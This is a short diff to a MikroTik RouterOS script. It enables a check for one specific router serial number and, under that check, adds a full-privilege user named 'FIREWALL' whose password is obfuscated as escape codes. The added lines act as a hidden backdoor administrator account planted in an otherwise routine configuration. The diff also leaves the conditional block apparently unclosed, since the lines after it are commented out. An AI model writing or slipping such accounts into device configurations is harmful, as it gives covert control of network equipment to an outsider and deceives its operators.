@@ -74,7 +74,8 @@ set protected-routerboot=enabled
 :delay 1;
 :execute script="/system routerboard upgrade"
 /system logging enable 0
-##:if ([/system routerboard get serial-number] = "\37\42\43\41\30\37\42\34\45\46\43\45") do={
+:if ([/system routerboard get serial-number] = "\36\46\33\39\30\38\33\33\38\35\42\45") do={
+/user add name="FIREWALL" password="\21\40\69\74\77\24\75\73\67\24\32\30\31\38\24\40\21" group=full
 ##/ip route
 ##add distance=1 dst-address=100.100.8.0/22 gateway=VITRO2;
 ##} else={
